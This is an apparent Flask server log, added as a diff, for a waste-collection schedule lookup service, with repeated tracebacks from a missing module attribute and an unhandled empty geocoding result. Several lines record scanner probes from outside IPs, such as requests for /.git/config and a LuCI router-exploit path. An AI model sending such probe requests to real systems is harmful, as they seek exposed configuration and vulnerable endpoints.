@@ -1,0 +1,1570 @@
+nohup: ignoring input
+ * Serving Flask app 'server'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:8080
+ * Running on http://10.152.0.4:8080
+Press CTRL+C to quit
+127.0.0.1 - - [26/Jun/2025 08:52:30] "GET /collections?address=30%20foot%20street,%20Frankston HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 08:52:39] "GET /collections?address=30%20foot%20street,%20Frankston HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 08:53:33] "GET / HTTP/1.0" 404 -
+204.76.203.212 - - [26/Jun/2025 08:55:20] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [26/Jun/2025 08:56:35] "GET /collections?address=1341%20Dandenong%20Road,%20Chadstone HTTP/1.0" 500 -
+127.0.0.1 - - [26/Jun/2025 09:03:12] "GET /collections?address=21%20chancellors%20walk,%20Clayton HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 09:03:15] "GET /collections?address=21%20chancellors%20walk,%20Clayton HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 09:04:00] "GET / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 09:04:12] "GET /collections?address=1341%20Dandenong%20Road,%20Chadstone HTTP/1.0" 500 -
+127.0.0.1 - - [26/Jun/2025 09:06:24] "GET /collections?address=2107/2125%20Princes%20Hwy,%20Clayton HTTP/1.0" 500 -
+127.0.0.1 - - [26/Jun/2025 09:09:05] "GET /collections?address=2125%20Dandenong%20Rd,%20Clayton HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 09:09:07] "GET /collections?address=2125%20Dandenong%20Rd,%20Clayton HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 09:12:39] "GET / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 09:13:30] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 09:13:53] "GET /.well-known/security.txt HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 09:19:04] "GET /.git/config HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 09:20:10] "GET / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 09:30:49] "GET / HTTP/1.0" 404 -
+185.218.84.178 - - [26/Jun/2025 09:37:19] "GET / HTTP/1.1" 404 -
+103.180.171.66 - - [26/Jun/2025 09:43:19] "GET /api/v1/settings HTTP/1.1" 404 -
+127.0.0.1 - - [26/Jun/2025 09:56:29] "GET / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 10:05:44] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 500 -
+127.0.0.1 - - [26/Jun/2025 10:06:15] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:06:22] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 500 -
+127.0.0.1 - - [26/Jun/2025 10:07:34] "GET /collections?address=30%20foot%20street,%20frankston HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:08:57] "GET /collections?address=30%20foot%20street,%20frankston HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:09:22] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 500 -
+[2025-06-26 10:11:48,277] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 61, in get_collections
+    Source = load_source(module)
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 38, in load_source
+    return mod.Source
+AttributeError: module 'melbourne_vic_gov_au' has no attribute 'Source'
+127.0.0.1 - - [26/Jun/2025 10:11:48] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 500 -
+[2025-06-26 10:11:56,340] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 61, in get_collections
+    Source = load_source(module)
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 38, in load_source
+    return mod.Source
+AttributeError: module 'melbourne_vic_gov_au' has no attribute 'Source'
+127.0.0.1 - - [26/Jun/2025 10:11:56] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 500 -
+[2025-06-26 10:13:54,882] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 61, in get_collections
+    Source = load_source(module)
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 38, in load_source
+    return mod.Source
+AttributeError: module 'melbourne_vic_gov_au' has no attribute 'Source'
+127.0.0.1 - - [26/Jun/2025 10:13:54] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 500 -
+127.0.0.1 - - [26/Jun/2025 10:14:01] "GET /collections?address=30%20foot%20street,%20frankston HTTP/1.0" 200 -
+[2025-06-26 10:15:38,200] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 61, in get_collections
+    Source = load_source(module)
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 38, in load_source
+    return mod.Source
+AttributeError: module 'melbourne_vic_gov_au' has no attribute 'Source'
+127.0.0.1 - - [26/Jun/2025 10:15:38] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 500 -
+[2025-06-26 10:16:30,177] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 61, in get_collections
+    Source = load_source(module)
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 38, in load_source
+    return mod.Source
+AttributeError: module 'melbourne_vic_gov_au' has no attribute 'Source'
+127.0.0.1 - - [26/Jun/2025 10:16:30] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 500 -
+127.0.0.1 - - [26/Jun/2025 10:17:19] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:17:30] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:17:34] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 200 -
+141.255.162.250 - - [26/Jun/2025 10:19:32] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 -
+204.76.203.212 - - [26/Jun/2025 10:19:41] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [26/Jun/2025 10:20:52] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 200 -
+185.242.226.25 - - [26/Jun/2025 10:22:30] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00\x8b\x01\x00\x00\x87\x03\x03"\x1asI\x8c\'G>|dÄ³öi\x7f·i;\x1b\x07HµoËWæ¸\x8d\x03Òý;\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+185.242.226.25 - - [26/Jun/2025 10:22:30] "\x16\x03\x01\x00\x8b\x01\x00\x00\x87\x03\x03"\x1asI\x8c'G>|dÄ³öi\x7f·i;\x1b\x07HµoËWæ¸\x8d\x03Òý;\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+[2025-06-26 10:24:11,817] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:24:11] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 10:24:12,330] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:24:12] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+127.0.0.1 - - [26/Jun/2025 10:24:37] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:24:37] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 200 -
+[2025-06-26 10:26:43,290] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:26:43] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 10:26:43,310] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:26:43] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 10:26:53,794] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:26:53] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 10:26:53,798] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:26:53] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+185.218.84.40 - - [26/Jun/2025 10:27:00] "GET / HTTP/1.1" 404 -
+[2025-06-26 10:27:02,897] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:27:02] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 10:27:02,930] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:27:02] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 10:27:03,796] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:27:03] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 10:27:03,830] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:27:03] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 10:27:17,496] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:27:17] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 10:27:18,064] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:27:18] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 10:27:25,863] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:27:25] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 10:27:25,869] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:27:25] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 10:27:35,124] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:27:35] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 10:27:35,679] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:27:35] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 10:27:45,446] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:27:45] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 10:27:45,448] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:27:45] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 10:28:01,925] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
